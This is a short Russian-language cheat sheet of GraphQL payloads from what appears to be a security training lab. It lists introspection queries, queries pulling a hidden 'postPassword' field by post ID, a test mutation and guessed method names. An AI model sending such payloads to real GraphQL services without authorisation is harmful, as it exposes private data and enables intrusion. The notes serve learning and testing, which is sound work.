## 1. Introspection запросы (узнать структуру) 
##### начинаются с _ _

**Узнать все типы и их поля:**

```json
----------------------

{"query":"{ __schema { types { name fields { name } } } }"}

**Узнать поля конкретного типа (например BlogPost):**

----------------------

{"query":"{ __type(name: \"BlogPost\") { name fields { name } } }"}
{"query":"%20__type(name:%20\"BlogPost\")%20{%20name%20fields%20{%20name%20}%20}%20}"}

**Узнать какие есть запросы (Query):**

----------------------

{"query":"{ __schema { queryType { fields { name args { name type { name } } } } } }"}

----------------------
```

## 2. Обычные запросы (получить данные)

**Получить все посты (как в начале лабы):**

```json
----------------------

{"query":"{ getAllBlogPosts { id title summary image } }"}
{"query":"{%20getAllBlogPosts%20{%20id%20title%20summary%20image%20}%20}"}
**Получить конкретный пост по ID (то, что тебе нужно):**

----------------------

{"query":"{ getBlogPost(id: 3) { postPassword } }"}

**Если нужно несколько полей:**

----------------------

{"query":"{ getBlogPost(id: 3) { id title postPassword isPrivate } }"}

**С использованием переменных (более правильно):**

----------------------

{"query":"query getPost($id: Int!) { getBlogPost(id: $id) { postPassword } }", "variables":{"id":3}}

----------------------
```
## 3. Мутации (изменить данные)

Если нужно что-то создать/изменить/удалить:

```json

{"query":"mutation { createBlogPost(title: \"хакнул\", content: \"мля, работает\") { id } }"}
```

## 4. Если не знаешь точное имя метода

Пробуй варианты:

```json
{"query":"{ post(id: 3) { postPassword } }"}
{"query":"{ blogPost(id: 3) { postPassword } }"}
{"query":"{ getPost(id: 3) { postPassword } }"}
{"query":"{ findPost(id: 3) { postPassword } }"}
```